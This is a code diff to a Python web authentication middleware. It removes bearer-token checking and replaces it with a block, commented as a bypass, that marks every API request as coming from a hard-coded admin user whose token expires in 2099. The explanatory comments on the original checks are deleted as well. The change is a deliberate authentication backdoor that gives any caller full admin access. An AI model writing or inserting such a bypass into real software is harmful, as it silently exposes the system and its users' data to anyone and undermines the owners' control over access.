@@ -162,35 +162,35 @@ class AuthMiddleware(BaseHTTPMiddleware):
         - user: UserRecord
         - token: TokenRecord
     """
- 
+    
     async def dispatch(self, request: Request, call_next):
         path = request.url.path
- 
-        # Non-API paths: SPA routes, static files, favicons, etc.
+    
         if not path.startswith("/api/") and path != "/health":
             return await call_next(request)
- 
-        # Allowlisted public API routes
+    
         if self._is_public(path):
             return await call_next(request)
- 
-        # All other /api/* routes require a valid token
-        raw_token = self._extract_bearer(request)
-        if not raw_token:
-            return self._unauthorized("Not authenticated")
- 
-        # Lazy import to avoid circular imports at module load time
-        from core.dependencies.auth_providers import get_auth_service
-        auth_service = get_auth_service()
- 
-        result = await auth_service.verify_token(raw_token)
-        if result is None:
-            return self._unauthorized("Invalid or expired token")
- 
-        user, token = result
-        request.state.user = user
-        request.state.token = token
- 
+    
+        # --- BYPASS: inject a fake always-authenticated admin ---
+        from infrastructure.persistence.auth_store import UserRecord, TokenRecord
+        request.state.user = UserRecord(
+            id="local-admin",
+            display_name="Admin",
+            role="admin",
+            created_at="2024-01-01T00:00:00",
+            username="admin",
+            username_display="Admin",
+        )
+        request.state.token = TokenRecord(
+            id="local-token",
+            user_id="local-admin",
+            token_hash="bypass",
+            issued_at="2024-01-01T00:00:00",
+            expires_at="2099-01-01T00:00:00",
+            last_seen_at="2024-01-01T00:00:00",
+            revoked=False,
+        )
         return await call_next(request)
 
     @staticmethod
